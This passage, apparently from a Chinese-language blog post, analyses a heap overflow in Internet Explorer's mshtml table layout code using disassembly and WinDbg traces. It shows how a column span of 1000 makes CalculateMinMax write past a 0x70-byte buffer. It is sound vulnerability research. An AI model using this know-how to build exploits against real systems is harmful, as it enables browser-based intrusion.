class="number">50</span>h], ecx</span><br><span class="line">.text:<span class="number">74</span>D302A6                 shl     eax, <span class="number">8</span></span><br><span class="line">.text:<span class="number">74</span>D302A9                 xor     eax, [ebx+<span class="number">44</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302AC                 <span class="keyword">and</span>     eax, <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">74</span>D302B1                 xor     [ebx+<span class="number">44</span>h], eax</span><br><span class="line">.text:<span class="number">74</span>D302B4                 test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">74</span>D302B8                 jnz     loc_74C5EE4D</span><br><span class="line">.text:<span class="number">74</span>D302BE</span><br><span class="line">.text:<span class="number">74</span>D302BE loc_74D302BE:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)-D133Bj</span><br><span class="line">.text:<span class="number">74</span>D302BE                 xor     eax, eax</span><br><span class="line">.text:<span class="number">74</span>D302C0</span><br><span class="line">.text:<span class="number">74</span>D302C0 loc_74D302C0:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">1957B</span>9j</span><br><span class="line">.text:<span class="number">74</span>D302C0                 <span class="keyword">or</span>      [ebp+var_38], eax</span><br><span class="line">.text:<span class="number">74</span>D302C3                 cmp     [ebp+arg_8], edi</span><br><span class="line">.text:<span class="number">74</span>D302C6                 jnz     loc_74EC5948</span><br><span class="line">.text:<span class="number">74</span>D302CC                 mov     eax, [ebx+<span class="number">94</span>h];-&gt;CTableLayout+<span class="number">0x94</span>,用于和spansum作比较，此处标记为spancmp</span><br><span class="line">.text:<span class="number">74</span>D302D2                 shr     eax, <span class="number">2</span>;-&gt; spancmp&gt;&gt;<span class="number">2</span>即spancmp/<span class="number">4</span></span><br><span class="line">.text:<span class="number">74</span>D302D5                 cmp     eax, edx;若spancmp &gt;= spansum,则跳转，这里是<span class="number">0</span>&lt;<span class="number">1</span>，所以不跳转。</span><br><span class="line">.text:<span class="number">74</span>D302D7                 jge     <span class="keyword">short</span> loc_74D30312</span><br><span class="line">.text:<span class="number">74</span>D302D9                 cmp     edx, edi</span><br><span class="line">.text:<span class="number">74</span>D302DB                 lea     esi, [ebx+<span class="number">90</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302E1                 jl      loc_74C2CE82</span><br><span class="line">.text:<span class="number">74</span>D302E7                 cmp     edx, [esi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">74</span>D302EA                 jbe     <span class="keyword">short</span> loc_74D302FF</span><br><span class="line">.text:<span class="number">74</span>D302EC                 push    <span class="number">1</span>Ch             ; <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">.text:<span class="number">74</span>D302EE                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D302F0                 mov     edi, esi</span><br><span class="line">.text:<span class="number">74</span>D302F2                 call    ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z ; CImplAry::EnsureSizeWorker(uint,<span class="keyword">long</span>)</span><br></pre></td></tr></table></figure>
+<p>跟进CImplAry::EnsureSizeWorker函数，发现该函数主要用于分配堆内存，分配的内存大小，分配的内存大小为<code>spansum * 0x1C</code>,虽然此处spansum为1，但其分配的最小值为<code>0x1C * 4=0x70</code>，分配的地址保存在CtableLayout+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">.text:74DF8F9C ; public: long __thiscall CDataAry&lt;long&gt;::EnsureSize(long)</span><br><span class="line">.text:74DF8F9C ?EnsureSize@?$CDataAry@J@@QAEJJ@Z proc near</span><br><span class="line">.text:74DF8F9C                                         ; CODE XREF: CTimerCtx::CTimerCtx(CTimerMan *,_RTL_CRITICAL_SECTION *)+ACp</span><br><span class="line">.text:74DF8F9C                                         ; CDocument::EnumObjects(ulong,IEnumUnknown * *)+6Bp ...</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74DF9013 SIZE 00000009 BYTES</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74EBD728 SIZE 00000007 BYTES</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C                 mov     edi, edi</span><br><span class="line">.text:74DF8F9E                 push    edi             ; __int32</span><br><span class="line">.text:74DF8F9F                 mov     edi, ecx</span><br><span class="line">.text:74DF8FA1                 test    eax, eax</span><br><span class="line">.text:74DF8FA3                 jl      loc_74EBD728</span><br><span class="line">.text:74DF8FA9                 cmp     eax, [edi+8]</span><br><span class="line">.text:74DF8FAC                 ja      short loc_74DF9013</span><br><span class="line">.text:74DF8FAE                 xor     eax, eax</span><br><span class="line">.text:74DF8FB0                 pop     edi</span><br><span class="line">.text:74DF8FB1                 retn</span><br><span class="line">.text:74DF8FB1 ?EnsureSize@?$CDataAry@J@@QAEJJ@Z endp</span><br><span class="line">.text:74DF8FB1</span><br><span class="line">.text:74DF8FB1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74DF8FB2                 db 5 dup(90h)</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; Attributes: bp-based frame</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; __int32 __thiscall CImplAry::EnsureSizeWorker(CImplAry *__hidden this, unsigned int, __int32)</span><br><span class="line">.text:74DF8FB7 ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z proc near</span><br><span class="line">.text:74DF8FB7                                         ; CODE XREF: CSelectionRenderingServiceProvider::GetSelectionChunksForLayout(CFlowLayout *,CRenderInfo *,CDataAry&lt;HighlightSegment&gt; *,int *,int *)-6B92p</span><br><span class="line">.text:74DF8FB7                                         ; CView::DeferTransition(COleSite *)+3Fp ...</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 dwBytes         = dword ptr -8</span><br><span class="line">.text:74DF8FB7 var_4           = dword ptr -4</span><br><span class="line">.text:74DF8FB7 Size            = dword ptr  8</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E02CB4 SIZE 00000036 BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E3BEEC SIZE 0000003D BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74EBD6E7 SIZE 0000000D BYTES</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7                 mov     edi, edi</span><br><span class="line">.text:74DF8FB9                 push    ebp</span><br><span class="line">.text:74DF8FBA                 mov     ebp, esp</span><br><span class="line">.text:74DF8FBC                 push    ecx</span><br><span class="line">.text:74DF8FBD                 push    ecx</span><br><span class="line">.text:74DF8FBE                 push    ebx</span><br><span class="line">.text:74DF8FBF                 push    esi             </span><br><span class="line">.text:74DF8FC0                 mov     esi, eax</span><br><span class="line">.text:74DF8FC2                 push    4</span><br><span class="line">.text:74DF8FC4                 pop     eax</span><br><span class="line">.text:74DF8FC5                 mov     [ebp+var_4], eax</span><br><span class="line">.text:74DF8FC8                 cmp     esi, eax</span><br><span class="line">.text:74DF8FCA                 jnb     loc_74E02CB4</span><br><span class="line">.text:74DF8FD0</span><br><span class="line">.text:74DF8FD0 loc_74DF8FD0:                           </span><br><span class="line">.text:74DF8FD0                                         ; CImplAry::EnsureSizeWorker(uint,long)+9D25j ...</span><br><span class="line">.text:74DF8FD0                 mov     eax, [ebp+var_4]; -&gt; eax=4</span><br><span class="line">.text:74DF8FD3                 mul     [ebp+Size]; -&gt;分配spansum*0x1C大小的内存，至少是0x1C*4=0x70</span><br><span class="line">.text:74DF8FD6                 push    edx</span><br><span class="line">.text:74DF8FD7                 push    eax;-&gt; size参数         </span><br><span class="line">.text:74DF8FD8                 lea     eax, [ebp+dwBytes]</span><br><span class="line">.text:74DF8FDB                 call    ?ULongLongToUInt@@YGJ_KPAI@Z ; ULongLongToUInt(unsigned __int64,uint *)</span><br><span class="line">.text:74DF8FE0                 mov     ebx, eax</span><br><span class="line">.text:74DF8FE2                 test    ebx, ebx</span><br><span class="line">.text:74DF8FE4                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF8FE6                 test    byte ptr [edi+4], 2</span><br><span class="line">.text:74DF8FEA                 jnz     loc_74E3BEEC</span><br><span class="line">.text:74DF8FF0                 push    [ebp+dwBytes] ;-&gt;spansum*0x1c=0x1c </span><br><span class="line">.text:74DF8FF3                 lea     esi, [edi+0Ch]</span><br><span class="line">.text:74DF8FF6                 call    ?_HeapRealloc@@YGJPAPAXI@Z ; -&gt;执行完CimplAry::EnsureSizeWorker函数保存的返回地址在CTableLayout+0x90+0xC，即导致漏洞的堆块，标记为vulheap</span><br><span class="line">.text:74DF8FFB                 mov     ebx, eax</span><br><span class="line">.text:74DF8FFD                 test    ebx, ebx</span><br><span class="line">.text:74DF8FFF                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF9001</span><br></pre></td></tr></table></figure></p>
+<p>我们看下分配的缓冲区vulheap地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax+0x168</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00000001 ebx=0492aea8 ecx=00000000 edx=00000001 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f2 esp=0467e40c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1d3:</span><br><span class="line">692d02f2 e8c08c0c00      call    mshtml!CImplAry::EnsureSizeWorker (69398fb7)</span><br></pre></td></tr></table></figure></p>
+<p>分配的地址在ebx+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=7741349f edx=00000000 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f7 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1df:</span><br><span class="line">692d02f7 85c0            test    eax,eax</span><br><span class="line">1:025&gt; dd ebx+9c</span><br><span class="line">0492af44  07e20f90 00000000 00000000 00000000</span><br><span class="line">0492af54  00000000 00000000 00000000 00000000</span><br><span class="line">0492af64  00000000 000000c8 000000c8 00000000</span><br><span class="line">0492af74  00000000 00000000 00000000 00000000</span><br><span class="line">0492af84  00000000 00000000 00000000 00000000</span><br><span class="line">0492af94  00000000 00000000 00000000 00000000</span><br><span class="line">0492afa4  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492afb4  00000001 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd 07e20f90 </span><br><span class="line">07e20f90  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fa0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fb0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fc0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e20ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">07e21000  ???????? ???????? ???????? ????????</span><br><span class="line"></span><br><span class="line">1:025&gt; !heap -p -a 07e20f90 </span><br><span class="line">    address 07e20f90 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 171000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 7e71f70:          7e20f90               70 -          7e20000             2000</span><br></pre></td></tr></table></figure></p>
+<p>此外，我们看一下用于比较的spansum和spancmp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">0492aefc  00000001 00000000 ffffffff 00000000</span><br><span class="line">0492af0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">0492af1c  0497eff0 691c9fd0 00000004 00000004</span><br><span class="line">0492af2c  04936ff0 00000000 00000000 691c9fd0</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">0492af3c  00000000 00000004 07f27f90 00000000</span><br><span class="line">0492af4c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0492af6c  000000c8 00000000 00000000 00000000</span><br><span class="line">0492af7c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af8c  00000000 00000000 00000000 00000000</span><br><span class="line">0492af9c  00000000 00000000 00000000 00000000</span><br><span class="line">0492afac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure></p>
+<p>从上面的代码段可知，这里分配了0x70大小的内存地址在CtableLayout+0x9C指向的地址。<br>总结：</p>
+<ul>
+<li>CtableLayout::CalculateMinMax的第一个参数为CtableLayout对象，即table标签在内存中的对象。</li>
+<li>CtableLayout+0x54：span属性值和spansum</li>
+<li>CtableLayout+0x9C: 保存vulheap,至少分配0x70字节的内存</li>
+<li>CtableLayout+0x94：用于和spansum比较的spancmp,当spancmp&gt;&gt;2小于spansum才分配漏洞堆块。</li>
+</ul>
+<p><strong>要注意的地方</strong><br><strong>再次g之后会出现允许activeX允许这个框，<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173022.png" alt=""><br>然后发现<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-173337.png" alt=""><br>这我也不知道是中间再次在哪触发了这个函数，还是重新运行了poc，总之这个时候的spansum和spancmp都没变，分别为1和0.<br>我觉得可能是中间又在哪触发了吧，不像是重新运行了，我也不确定是为什么，没有完整的阅读这个模块。<br>总之再次g之后，就和泉哥书上一致了。spansum还是1，spancmp变成4.</strong></p>
+<p>当分配完内存后，执行poc中的over_trigger函数时，会再一次断在CTableLayout::CalculateMinMax函数中，跟进去看下spansum和spancmp的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line"> 1 e 692d02f2     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax+0x1d3</span><br><span class="line">1:025&gt; bc 1</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br></pre></td></tr></table></figure></p>
+<p>把之前设置的多余断点删掉，注意bc后跟的是断点的标号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; g</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.e94): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.758): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=063bbea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd ebx+54</span><br><span class="line">082e6efc  00000001 ffffffff ffffffff ffffffff</span><br><span class="line">082e6f0c  ffffffff 691c9fd0 00000004 00000004</span><br><span class="line">082e6f1c  0816bff0 691c9fd0 00000004 00000004</span><br><span class="line">082e6f2c  082a2ff0 00000000 00000000 691c9fd0</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">1:025&gt; dd ebx+94</span><br><span class="line">082e6f3c  00000004 00000004 070f4f90 00000000</span><br><span class="line">082e6f4c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f5c  00000000 00000000 00000000 000000c8</span><br><span class="line">082e6f6c  000000c8 00000000 00000000 00000000</span><br><span class="line">082e6f7c  00000000 00000000 00000000 00000001</span><br><span class="line">082e6f8c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6f9c  00000000 00000000 00000000 00000000</span><br><span class="line">082e6fac  00000000 ffffffff 00000001 00000000</span><br></pre></td></tr></table></figure>
+<p>spansum为1，spancmp的值为4，(4&gt;&gt;2)为1==1,不发生跳转，不分配内存。</p>
+<p>但是在over_trigger中，我们已经将span设置为1000了，这也是允许的最大值。<br>接着执行到mshtml!CTableLayout::CalculateMinMax+0x37e,我本来bp了一个断点在这，然后g一下，可是并没有断下来（这里没有断下来应该还是我断点下错了，没有进入那个断点的语句块），所以没办法，单步p呗，然后发现了新姿势，p 10能一次10下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a2e esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x37e:</span><br><span class="line">69465a2e e8d445dfff      call    mshtml!CTableCol::GetAAspan (6925a007)---&gt;获取span列数，此处返回1</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001--&gt;返回值 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h---&gt;span最多为1000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a38 esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x388:</span><br><span class="line">69465a38 894510          mov     dword ptr [ebp+10h],eax ss:0023:0467e4bc=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000001 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a3b esp=0467e410 ebp=0467e4ac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x38b:</span><br><span class="line">69465a3b 7c07            jl      mshtml!CTableLayout::CalculateMinMax+0x394 (69465a44) [br=1]</span><br></pre></td></tr></table></figure></p>
+<p>在mshtml!CTableCol::GetAAspan下断点，让它第二次获取span值的时候断下来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=082e6ea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0467df24</span><br><span class="line">eip=692d018a esp=0467dcc8 ebp=0467dee0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=08864fd0 ebx=082e6ea8 ecx=00000032 edx=00000000 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=6925a007 esp=0467dc24 ebp=0467dcc4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableCol::GetAAspan:</span><br><span class="line">6925a007 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; gu</span><br><span class="line">eax=000003e8---&gt;返回值，此时span的值已经是0x3e8即最大值1000了 ebx=082e6ea8 ecx=00000002 edx=082d0ff0 esi=04f47fac edi=08864fd0</span><br><span class="line">eip=69465a33 esp=0467dc28 ebp=0467dcc4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">69465a33 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure></p>
+<p>gu是执行到当前函数结束返回。<br>此时span的值已经是0x3e8即最大值1000了。<br>继续分析后续代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">text:74EC5AB3                 call    ?GetPixelWidth@CWidthUnitValue@@QBEHPBVCDocInfo@@PAVCElement@@H@Z ; CWidthUnitValue::GetPixelWidth(CDocInfo const *,CElement *,int)</span><br><span class="line">.text:74EC5AB8                 cmp     [ebp+var_5C], 0</span><br><span class="line">.text:74EC5ABC                 mov     [ebp+var_2C], eax;---&gt;计算width得到copydata=width*100</span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:74EC5B3E                 mov     eax, [ebp+arg_8];-----&gt;span=1000</span><br><span class="line">.text:74EC5B41                 imul    ecx, 1Ch----&gt;1000*0x1C</span><br><span class="line">.text:74EC5B44                 add     [ebp+var_38], eax</span><br><span class="line">.text:74EC5B47                 mov     [ebp+var_20], ecx</span><br><span class="line">.text:74EC5B4A                 jmp     short loc_74EC5B4F；----&gt;vulheap地址</span><br><span class="line">.text:74EC5B4C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74EC5B4C</span><br><span class="line">.text:74EC5B4C loc_74EC5B4C:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195A11j</span><br><span class="line">.text:74EC5B4C                 mov     ecx, [ebp+var_20]</span><br><span class="line">.text:74EC5B4F</span><br><span class="line">.text:74EC5B4F loc_74EC5B4F:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1959C0j</span><br><span class="line">.text:74EC5B4F                 mov     eax, [ebx+9Ch];----&gt;vulheap地址</span><br><span class="line">.text:74EC5B55                 add     eax, ecx;-----&gt;offset=vulheap+1000*0x1c&gt;0x70(vulheap大小)，最终会导致堆溢出！</span><br><span class="line">.text:74EC5B57                 cmp     [ebp+var_1C], 